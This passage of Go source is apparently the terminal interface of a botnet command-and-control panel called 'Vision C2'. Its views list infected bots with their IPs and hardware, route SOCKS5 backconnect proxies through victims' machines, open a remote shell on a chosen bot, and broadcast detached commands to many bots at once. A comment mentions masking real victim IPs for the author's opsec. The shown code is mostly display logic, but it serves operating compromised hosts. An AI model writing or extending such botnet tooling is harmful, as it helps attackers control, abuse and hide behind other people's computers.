⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠠⡈⠒⠥⣀⠀⠐⠄⡉⠢⣝⡲⢬⡪⣎⢧⠽⠟⡺⠿⠛⠋⠉⠉⠉⠉⠉⠙⠛⠛⠿⣟⡻⢷⣾⣫⠥⡺⠕⣀⠤⡊⠀⢠⠀⢀⡠⠂⢀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠒⠤⣀⠑⠢⠬⣽⣒⠤⠈⠒⡦⢭⣟⠚⣩⠰⠊⠁⠀⠀⠀⢀⡀⡀⠀⠀⠀⠀⠀⠀⢀⠀⠉⠓⢮⣝⡳⢻⣭⠖⣋⠠⣀⡴⠞⡩⠄⠚⠁⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⢀⡀⠈⠀⠀⠀⠈⠁⠒⠀⠬⠍⠛⠛⣚⣩⡆⠋⠁⣀⣴⣶⠏⣠⡞⣡⣶⣶⣶⡄⠀⠀⠀⠀⠀⠻⣷⣦⣀⠈⠛⢶⣬⣓⣒⢛⣃⣉⠠⠔⠀⠠⠂⠁⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠠⠀⠀⠀⠈⠁⠐⠢⠤⣁⣒⣒⣛⣂⣶⡟⠟⠉⢀⣤⣾⣿⣿⡏⢠⢶⡃⢿⣿⣿⠿⠁⠀⠀⠀⠀⠀⠀⢹⣿⣿⣷⣤⠀⠈⠻⢯⣟⣂⣂⣒⣒⣒⣈⡩⠥⠐⠈⠁⠀⠀⠠⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠐⠒⣒⣛⣿⣿⣛⠉⠀⠀⠠⣾⣿⣿⣿⣿⡅⢊⠎⣹⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⠀⠀⠀⠉⣛⠒⢲⠆⠡⠤⠤⠤⠒⠒⠀⠈⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠈⠀⡀⠠⠤⠐⠒⠒⣒⠒⠚⠳⠼⠛⠿⣶⣥⡠⡀⠙⢿⣿⣿⣿⣇⠀⠘⠄⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣮⣿⣿⣿⠟⠃⠀⢀⣴⣶⠿⠛⢿⣽⣛⠋⣉⣉⠉⠒⠒⠒⠂⠐⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠒⠀⠩⠉⠀⠉⠉⢑⡚⢛⢋⠸⠝⠿⣮⣔⠄⡈⠛⠿⣿⣄⠈⠀⠁⠂⠄⠀⠀⠀⠀⠀⠀⢀⣼⣿⠿⠛⢁⢀⣠⣾⡻⠯⠭⣉⡙⠓⠚⠥⢄⡀⠀⠀⠈⠉⠐⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠤⠄⠀⠤⠐⠀⠈⢉⡠⠄⣀⠤⠒⣈⡭⠾⢙⡿⣾⣤⣂⠀⣉⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠊⣉⠠⣀⣬⡶⢿⣟⠯⢍⡛⠶⡤⠉⠑⠢⢄⠀⠀⠉⠀⠂⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠒⡡⠔⠈⠀⠢⠋⠁⠂⠀⣡⠴⢃⣵⢟⡟⣷⣾⣿⣶⣶⣤⣤⣤⣴⣶⣦⣬⡷⣶⢿⢯⡳⣌⠢⢍⠛⠦⠌⠑⠠⠀⠀⠲⠤⡉⠢⠀⠈⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠊⠀⠀⠀⠀⠄⠀⠀⠁⠘⢁⢀⠔⠁⠁⣽⢣⣇⡏⡏⣿⡟⣿⣿⢿⣿⣿⢸⡵⢹⣯⠆⠑⢜⢣⡀⠉⠢⣈⠂⠀⠀⠀⠀⠀⠀⠂⡀⠀⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠔⠀⠀⡠⠈⠀⠀⠀⣰⠑⢸⣹⢹⢿⣿⡇⣿⣿⢸⡟⢸⠈⣷⠁⠙⢇⠀⠀⠀⠙⢦⡀⠈⠃⢄⠀⠀⠀⠐⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⡀⠁⠀⠀⠀⠀⠀⠀⠀⠁⠃⠇⢸⢸⢸⠸⡏⡇⢸⣿⢸⣧⢨⠀⡝⡏⠀⠈⠂⠀⠀⠀⢀⠀⠀⠀⡀⠑⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠀⠀⠀⠀⠀⠀⡸⢸⢸⠀⣧⢿⢸⣿⠀⣿⠈⠀⠇⡇⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠈⠄⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⠀⢁⠘⠀⡀⠸⡌⢸⣿⠀⡏⠀⢀⠀⡄⠀⣤⠀⠀⠀⠐⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⡀⠇⠸⠃⢸⣿⠀⠇⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠈⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠇⢀⡇⢸⣸⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢀⠀⠀⠀⠁⠀⠂⠸⡟⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀Vision C2⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠇⢀⡇⢸⣸⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠂⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`
	// Gradient colors — deep purple to cyan wash
	gradientColors := []string{
		"93",  // Purple
		"93",  // Purple
		"99",  // Purple-blue
		"99",  // Purple-blue
		"105", // Blue-purple
		"105", // Blue-purple
		"111", // Light blue
		"111", // Light blue
		"117", // Cyan-blue
		"117", // Cyan-blue
		"123", // Light cyan
		"123", // Light cyan
		"159", // Pale cyan
		"195", // Very light cyan
		"159", // Pale cyan
		"123", // Light cyan
		"117", // Cyan-blue
		"105", // Blue-purple
		"240", // Dim gray
		"240", // Dim gray
		"135", // Purple accent
		"240", // Dim gray
		"93",  // Purple
	}

	b.WriteString("\n")
	for i, line := range strings.Split(bannerLines, "\n") {
		colorIdx := i
		if colorIdx >= len(gradientColors) {
			colorIdx = len(gradientColors) - 1
		}
		style := lipgloss.NewStyle().Foreground(lipgloss.Color(gradientColors[colorIdx]))
		b.WriteString(style.Render(line) + "\n")
	}

	// Compact stats bar right under banner
	statsBar := m.renderStatsBar()
	b.WriteString(statsBar)
	b.WriteString("\n\n")

	// Suave minimal menu
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("135"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	accent := lipgloss.NewStyle().Foreground(lipgloss.Color("105"))

	menuWidth := 48
	b.WriteString(accent.Render("    ┌"+strings.Repeat("─", menuWidth)+"┐") + "\n")
	b.WriteString(accent.Render("    │") + neonPink.Bold(true).Render(centerText("N A V I G A T I O N", menuWidth)) + accent.Render("│") + "\n")
	b.WriteString(accent.Render("    ├"+strings.Repeat("─", menuWidth)+"┤") + "\n")

	menuIcons := []string{"▶", "▶", "▶", "▶", "▶", "▶"}
	for i, item := range m.menuItems {
		icon := "▶"
		if i < len(menuIcons) {
			icon = menuIcons[i]
		}
		if i == m.menuCursor {
			selector := neonCyan.Bold(true).Render("  ▸ " + icon + " ")
			itemText := lipgloss.NewStyle().
				Foreground(lipgloss.Color("51")).
				Bold(true).
				Render(padRight(item, menuWidth-7))
			b.WriteString(accent.Render("    │") + selector + itemText + accent.Render("│") + "\n")
		} else {
			b.WriteString(accent.Render("    │") + dim.Render("    "+icon+" "+padRight(item, menuWidth-7)) + accent.Render("│") + "\n")
		}
	}

	b.WriteString(accent.Render("    ├"+strings.Repeat("─", menuWidth)+"┤") + "\n")
	b.WriteString(accent.Render("    │") + dim.Render(centerText("↑↓  navigate    ↵  select    q  quit", menuWidth)) + accent.Render("│") + "\n")
	b.WriteString(accent.Render("    └"+strings.Repeat("─", menuWidth)+"┘") + "\n")

	return b.String()
}

// Helper function to center text within a given width
func centerText(text string, width int) string {
	if len(text) >= width {
		return text[:width]
	}
	padding := (width - len(text)) / 2
	return strings.Repeat(" ", padding) + text + strings.Repeat(" ", width-len(text)-padding)
}

// Helper function to pad text to the right
func padRight(text string, width int) string {
	if len(text) >= width {
		return text[:width]
	}
	return text + strings.Repeat(" ", width-len(text))
}

// DEMO MODE: Set to true to mask real IPs with random ones this is something I use for my own opsec during recording gifs for the docs
var demoMode = false

// Generate a deterministic random IP based on the real IP (so it stays consistent)
func maskIP(realIP string) string {
	if !demoMode {
		return realIP
	}
	// Use hash of real IP to generate consistent fake IP
	hash := 0
	for _, c := range realIP {
		hash = hash*31 + int(c)
	}
	if hash < 0 {
		hash = -hash
	}
	return fmt.Sprintf("%d.%d.%d.%d",
		(hash%200)+10,
		((hash/256)%200)+10,
		((hash/65536)%200)+10,
		((hash/16777216)%200)+10)
}

func (m TUIModel) renderStatsBar() string {
	// Suave stats bar — clean, spaced
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	cyan := lipgloss.NewStyle().Foreground(lipgloss.Color("117"))
	green := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	orange := lipgloss.NewStyle().Foreground(lipgloss.Color("214"))
	purple := lipgloss.NewStyle().Foreground(lipgloss.Color("135"))

	status := green.Render("● online")
	if m.botCount == 0 {
		status = lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render("○ no bots")
	}

	ramStr := formatRAM(m.totalRAM)
	uptime := getC2Uptime()

	bar := fmt.Sprintf("  %s  %s  %s  %s  %s  %s",
		status,
		dim.Render("·")+" "+cyan.Render(fmt.Sprintf("%d", m.botCount))+dim.Render(" bots"),
		dim.Render("·")+" "+cyan.Render(ramStr),
		dim.Render("·")+" "+purple.Render(fmt.Sprintf("%d", m.totalCPU))+dim.Render(" cores"),
		dim.Render("·")+" "+orange.Render(uptime),
		dim.Render("·")+" "+green.Render("EZF3"))

	return bar
}

func (m TUIModel) viewBotList() string {
	var b strings.Builder

	b.WriteString(headerStyle.Render("  CONNECTED BOTS"))
	b.WriteString("\n\n")

	if len(m.bots) == 0 {
		b.WriteString(subtitleStyle.Render("  No bots connected"))
		b.WriteString("\n")
	} else {
		// Table header
		colDim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
		header := fmt.Sprintf("  %-12s %-4s %-14s %-16s %-8s %-5s %-12s %-10s %-10s",
			"ID", "GEO", "ARCH", "IP", "RAM", "CPU", "PROCESS", "UPLINK", "UPTIME")
		b.WriteString(colDim.Render(header))
		b.WriteString("\n")
		b.WriteString(colDim.Render("  " + strings.Repeat("─", 96)))
		b.WriteString("\n")

		// Country flag styling
		geoStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("226")).Bold(true)
		procStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("135"))

		for i, bot := range m.bots {
			cursor := "  "
			style := botItemStyle
			if i == m.botCursor {
				cursor = "▸ "
				style = botSelectedStyle
			}

			uptime := formatDuration(bot.Uptime)
			cpuStr := fmt.Sprintf("%d", bot.CPU)
			country := bot.Country
			if country == "" {
				country = "??"
			}
			procName := bot.ProcessName
			if procName == "" {
				procName = "unknown"
			}

			// Pad text BEFORE applying styles to avoid ANSI codes breaking alignment
			line := style.Render(fmt.Sprintf("%-12s", truncate(bot.ID, 10))) + " " +
				geoStyle.Render(fmt.Sprintf("%-4s", country)) + " " +
				style.Render(fmt.Sprintf("%-14s", bot.Arch)) + " " +
				style.Render(fmt.Sprintf("%-16s", maskIP(bot.IP))) + " " +
				style.Render(fmt.Sprintf("%-8s", formatRAM(bot.RAM))) + " " +
				style.Render(fmt.Sprintf("%-5s", cpuStr)) + " " +
				procStyle.Render(fmt.Sprintf("%-12s", truncate(procName, 10))) + " " +
				style.Render(fmt.Sprintf("%-10s", uptime))

			b.WriteString(fmt.Sprintf("%s%s\n", cursor, line))
		}
	}

	b.WriteString("\n")
	b.WriteString(subtitleStyle.Render("  [q] Back  [r] Refresh  [enter] Select"))
	b.WriteString("\n")

	return b.String()
}

func (m TUIModel) viewSocks() string {
	var b strings.Builder

	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))

	b.WriteString(headerStyle.Render("  🧦 SOCKS5 BACKCONNECT PROXY"))
	b.WriteString("\n")

	// View mode tabs
	viewModes := []string{"All Bots", "Active Socks", "Stopped"}
	b.WriteString("  ")
	for i, mode := range viewModes {
		if i == m.socksViewMode {
			b.WriteString(neonCyan.Bold(true).Render(" [" + mode + "] "))
		} else {
			b.WriteString(dim.Render("  " + mode + "  "))
		}
	}
	b.WriteString("\n")
	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n\n")

	// Stats
	activeCount := 0
	for _, sock := range m.socksList {
		if sock.Status == "active" {
			activeCount++
		}
	}
	b.WriteString(fmt.Sprintf("  %s %s   %s %s   %s %s\n\n",
		dim.Render("Bots:"), white.Render(fmt.Sprintf("%d", len(m.bots))),
		dim.Render("Active Proxies:"), neonGreen.Render(fmt.Sprintf("%d", activeCount)),
		dim.Render("Mode:"), neonYellow.Render("Direct")))

	// Build display list based on view mode
	type displayItem struct {
		botID    string
		botIP    string
		botArch  string
		port     string
		status   string
		started  time.Time
		username string
		password string
	}
	var items []displayItem

	switch m.socksViewMode {
	case 0: // All Bots - show all connected bots
		for _, bot := range m.bots {
			item := displayItem{
				botID:   bot.ID,
				botIP:   bot.IP,
				botArch: bot.Arch,
				status:  "none",
			}
			// Check if this bot has active socks
			for _, sock := range m.socksList {
				if sock.BotID == bot.ID {
					item.port = sock.Port
					item.status = sock.Status
					item.started = sock.StartedAt
					item.username = sock.Username
					item.password = sock.Password
					break
				}
			}
			items = append(items, item)
		}
	case 1: // Active Socks only
		for _, sock := range m.socksList {
			if sock.Status == "active" {
				arch := ""
				for _, bot := range m.bots {
					if bot.ID == sock.BotID {
						arch = bot.Arch
						break
					}
				}
				items = append(items, displayItem{
					botID:    sock.BotID,
					botIP:    sock.BotIP,
					botArch:  arch,
					port:     sock.Port,
					status:   "active",
					started:  sock.StartedAt,
					username: sock.Username,
					password: sock.Password,
				})
			}
		}
	case 2: // Stopped
		for _, sock := range m.socksList {
			if sock.Status == "stopped" {
				arch := ""
				for _, bot := range m.bots {
					if bot.ID == sock.BotID {
						arch = bot.Arch
						break
					}
				}
				items = append(items, displayItem{
					botID:    sock.BotID,
					botIP:    sock.BotIP,
					botArch:  arch,
					port:     sock.Port,
					status:   "stopped",
					started:  sock.StartedAt,
					username: sock.Username,
					password: sock.Password,
				})
			}
		}
	}

	if len(items) == 0 {
		if m.socksViewMode == 0 {
			b.WriteString(dim.Render("  No bots connected"))
		} else {
			b.WriteString(dim.Render("  No socks proxies in this view"))
		}
		b.WriteString("\n")
	} else {
		// Table header
		header := fmt.Sprintf("  %-18s %-16s %-10s %-12s %-10s %-20s", "BOT ID", "IP", "ARCH", "PORT", "STATUS", "AUTH")
		b.WriteString(dim.Render(header))
		b.WriteString("\n")
		b.WriteString(dim.Render("  " + strings.Repeat("─", 86)))
		b.WriteString("\n")

		// Show max 10 items
		displayCount := len(items)
		if displayCount > 10 {
			displayCount = 10
		}

		for i := 0; i < displayCount; i++ {
			item := items[i]
			cursor := "  "
			style := botItemStyle
			if i == m.socksCursor {
				cursor = "▸ "
				style = botSelectedStyle
			}

			// Status + port display
			var statusStyled, portDisplay string
			switch item.status {
			case "active":
				statusStyled = neonGreen.Render("● ACTIVE")
				portDisplay = neonYellow.Render(item.port)
			case "stopped":
				statusStyled = neonRed.Render("○ STOPPED")
				portDisplay = dim.Render(item.port)
			default:
				statusStyled = dim.Render("- NONE")
				portDisplay = dim.Render("-")
			}

			// Auth display
			var authDisplay string
			if item.username != "" && item.password != "" {
				authDisplay = neonCyan.Render(item.username + ":" + item.password)
			} else if item.status == "active" {
				authDisplay = dim.Render("(no auth)")
			} else {
				authDisplay = dim.Render("-")
			}

			line := fmt.Sprintf("%-18s %-16s %-10s ",
				truncate(item.botID, 16),
				maskIP(item.botIP),
				item.botArch,
			)
			b.WriteString(fmt.Sprintf("%s%s", cursor, style.Render(line)))
			b.WriteString(fmt.Sprintf("%-12s ", portDisplay))
			b.WriteString(fmt.Sprintf("%-10s ", statusStyled))
			b.WriteString(authDisplay)
			b.WriteString("\n")
		}

		if len(items) > 10 {
			b.WriteString(dim.Render(fmt.Sprintf("  ... and %d more", len(items)-10)))
			b.WriteString("\n")
		}
	}

	b.WriteString("\n")
	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n")

	// Input mode or normal mode
	if m.socksInputMode {
		b.WriteString(neonPink.Bold(true).Render("  START SOCKS5 PROXY"))
		b.WriteString("\n")
		if m.socksCursor < len(items) {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				dim.Render("Bot:"),
				neonCyan.Render(items[m.socksCursor].botID)))
		}
		cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("█")
		// Port / Relay field
		portLabel := dim.Render("  Port/Relay:")
		if m.socksInputStep == 0 {
			portLabel = neonCyan.Render("  ▸ Port/Relay:")
		}
		portCursor := ""
		if m.socksInputStep == 0 {
			portCursor = cursor
		}
		portHint := m.socksNewPort
		if portHint == "" && m.socksInputStep != 0 {
			portHint = "(1080)"
		}
		b.WriteString(fmt.Sprintf("%s %s%s\n", portLabel, neonGreen.Render(portHint), portCursor))
		// Username field
		userLabel := dim.Render("  User:")
		if m.socksInputStep == 1 {
			userLabel = neonCyan.Render("  ▸ User:")
		}
		userCursor := ""
		if m.socksInputStep == 1 {
			userCursor = cursor
		}
		userDisplay := m.socksNewUser
		if userDisplay == "" && m.socksInputStep != 1 {
			userDisplay = "(none)"
		}
		b.WriteString(fmt.Sprintf("%s %s%s\n", userLabel, neonGreen.Render(userDisplay), userCursor))
		// Password field
		passLabel := dim.Render("  Pass:")
		if m.socksInputStep == 2 {
			passLabel = neonCyan.Render("  ▸ Pass:")
		}
		passCursor := ""
		if m.socksInputStep == 2 {
			passCursor = cursor
		}
		passDisplay := strings.Repeat("*", len(m.socksNewPass))
		if passDisplay == "" && m.socksInputStep != 2 {
			passDisplay = "(none)"
		}
		b.WriteString(fmt.Sprintf("%s %s%s\n", passLabel, neonGreen.Render(passDisplay), passCursor))
		b.WriteString("\n")
		b.WriteString(dim.Render("  [tab] Next field   [enter] Connect   [esc] Cancel"))
		b.WriteString("\n")
	} else {
		// Hotkey help
		hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
		b.WriteString(fmt.Sprintf("  %s Direct (1080)   %s Custom   %s Stop   %s/%s View   %s Back\n",
			hotkey.Render("[s]"),
			hotkey.Render("[c]"),
			hotkey.Render("[x]"),
			hotkey.Render("[←]"),
			hotkey.Render("[→]"),
			hotkey.Render("[q]")))
		b.WriteString(dim.Render("  Custom: enter a port for direct, or host:port for relay backconnect"))
		b.WriteString("\n")
	}

	return b.String()
}

func (m TUIModel) viewRemoteShell() string {
	var b strings.Builder

	// Header with bot info
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))

	b.WriteString(headerStyle.Render("  REMOTE SHELL"))
	b.WriteString("\n")

	b.WriteString(fmt.Sprintf("  %s %s %s %s\n",
		dim.Render("Bot:"),
		neonCyan.Render(truncate(m.selectedBot, 20)),
		dim.Render("│ Arch:"),
		neonYellow.Render(m.selectedBotArch)))
	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n\n")

	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))

	// Shell output
	outputHeight := 13
	totalLines := len(m.shellOutput)

	// Calculate visible window based on scroll offset
	endIdx := totalLines - m.shellScrollOffset
	if endIdx < 0 {
		endIdx = 0
	}
	startIdx := endIdx - outputHeight
	if startIdx < 0 {
		startIdx = 0
	}

	visibleLines := 0
	for i := startIdx; i < endIdx; i++ {
		b.WriteString("  " + m.shellOutput[i] + "\n")
		visibleLines++
	}

	for i := visibleLines; i < outputHeight; i++ {
		b.WriteString("\n")
	}

	// Scroll indicator
	if m.shellScrollOffset > 0 {
		scrollInfo := fmt.Sprintf("  ─── ↑ %d more lines (pgup/pgdown) ", m.shellScrollOffset)
		b.WriteString(dim.Render(scrollInfo))
	} else if totalLines > outputHeight {
		b.WriteString(dim.Render("  ─── end (pgup to scroll) "))
	} else {
		b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	}
	b.WriteString("\n")

	if m.confirmKill {
		warnStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Bold(true)
		b.WriteString(warnStyle.Render("  KILL BOT? This will remove the bot permanently!"))
		b.WriteString("\n")
		b.WriteString(fmt.Sprintf("  %s Yes  %s No\n",
			neonGreen.Render("[y]"),
			neonRed.Render("[n]")))
	} else {
		prompt := neonGreen.Render("  $ ")
		cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("█")
		b.WriteString(prompt + m.shellInput + cursor)
		b.WriteString("\n\n")

		b.WriteString(dim.Render("  [enter] Execute  [↑/↓] History  [pgup/pgdn] Scroll  [ctrl+f] Clear  [ctrl+x] Kill  [esc] Menu\n"))
	}

	return b.String()
}

func (m TUIModel) viewBroadcastShell() string {
	var b strings.Builder

	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))

	b.WriteString(headerStyle.Render("  BROADCAST SHELL"))
	b.WriteString("\n")

	// Targeting info - aligned layout
	archDisplay := "ALL"
	if m.broadcastArch != "" {
		archDisplay = m.broadcastArch
	}
	ramDisplay := "ANY"
	if m.broadcastMinRAM > 0 {
		ramDisplay = fmt.Sprintf("≥%dMB", m.broadcastMinRAM)
	}
	countDisplay := "ALL"
	if m.broadcastMaxBots > 0 {
		countDisplay = fmt.Sprintf("≤%d", m.broadcastMaxBots)
	}

	b.WriteString(fmt.Sprintf("  %-6s %-10s │ %-6s %-10s │ %-5s %-8s │ %-5s %-6s\n",
		dim.Render("Mode:"), neonPink.Render("DETACHED"),
		dim.Render("Arch:"), neonCyan.Render(fmt.Sprintf("%-8s", archDisplay)),
		dim.Render("RAM:"), neonYellow.Render(fmt.Sprintf("%-6s", ramDisplay)),
		dim.Render("Max:"), neonYellow.Render(countDisplay)))
	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n\n")

	b.WriteString(dim.Render("  Commands run detached — no output returned.") + "\n\n")

	// Command history (last 8 commands)
	historyStart := 0
	if len(m.shellHistory) > 8 {
		historyStart = len(m.shellHistory) - 8
